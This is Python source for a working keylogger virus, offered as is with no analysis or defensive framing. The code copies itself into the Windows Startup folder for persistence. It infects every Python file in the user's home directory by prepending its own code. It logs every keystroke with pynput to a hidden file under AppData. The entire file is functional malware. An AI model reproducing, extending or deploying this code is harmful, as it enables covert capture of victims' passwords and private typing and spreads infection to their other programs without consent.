#start
from pynput.keyboard import Listener
import os
import logging
from shutil import copyfile
import threading
from threading import Thread
import sys, glob
import time

# autostarts
username = os.getlogin()
copyfile('keylogger.py', f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.py")

#store THIS file code
code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
area = False
for line in lines:
    if line == "#start\n":
        area = True
    if area:
        code.append(line)
    if line == "#end\n":
        break

def checkfiles(files):
    #opens each file
    for file in files:
        with open(file, "r") as f:
            #new file code
            file_code = f.readlines()

        #checking
        infected = False
        for line in file_code:
            if line == "#start\n":
                infected = True
                break
        if not infected:
            final_code = []
            #add THIS file code
            final_code.extend(code)
            #add breaklines
            final_code.extend("\n")
            final_code.extend("\n")
            #add new file code
            final_code.extend(file_code)
            with open(file, "w") as f:
                f.writelines(final_code)

#find files
username = os.getlogin()
rootdir = f'C:/Users/{username}'

for subdir, dirs, files in os.walk(rootdir):
    for i in dirs:
        folderpath = os.path.join(subdir, i)
        try:
            os.chdir(folderpath)
            python = glob.glob("*.py") + glob.glob("*.pyw")
            checkfiles(python)
        except:
            pass

#create log file
def createlogs():
    username = os.getlogin()
    if os.path.exists(f"C:\\Users\\{username}\\AppData\\Roaming\\zzz") == False:
        os.mkdir(f"C:\\Users\\{username}\\AppData\\Roaming\\zzz")
    logdirectory = f"C:\\Users\\{username}\\AppData\\Roaming\\zzz"
    logging.basicConfig(filename=f"{logdirectory}\logs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def start():
    #function for log file
    def startingkey(key):
        logging.info(key)
    #start logger
    with Listener(on_press=startingkey) as listener:
        listener.join()


if __name__ == '__main__':
    createlogs = threading.Thread(name='daemon', target=createlogs)
    createlogs.setDaemon(True)
    createlogs.start()
    createlogs.join()

    start = threading.Thread(name='daemon', target=start)
    start.setDaemon(True)
    start.start()
    start.join()
    
#end
